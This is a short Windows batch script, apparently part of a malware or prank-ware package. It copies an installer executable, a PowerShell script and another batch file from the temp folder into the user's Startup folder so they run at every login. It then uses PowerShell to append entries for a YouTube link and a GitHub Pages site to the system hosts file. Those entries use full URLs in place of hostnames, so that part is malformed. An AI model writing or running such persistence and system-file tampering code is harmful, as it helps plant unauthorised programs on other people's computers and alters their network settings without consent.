@echo off
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Trah3trahin_installer.exe" xcopy "%TEMP%\Trah3trahin_installer.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y /S
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\question.ps1" xcopy "%TEMP%\question.ps1" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y /S
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\groh4.bat" xcopy "%TEMP%\groh4.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y /S
set "targetFile=%SystemRoot%\System32\drivers\etc\hosts"
set "entry1=127.0.0.1 https://www.youtube.com/watch?v=dzMq5_thk4o"
set "entry2=127.0.0.1 https://streetick.github.io/moshet-pomoshet"

call :checkAdd "%entry1%"
call :checkAdd "%entry2%"

endlocal
exit /b

:checkAdd
findstr /C:%1 "%targetFile%" >nul 2>&1
if errorlevel 1 (
    powershell -Command "Add-Content -Path '%targetFile%' -Value %1"
)
exit /b
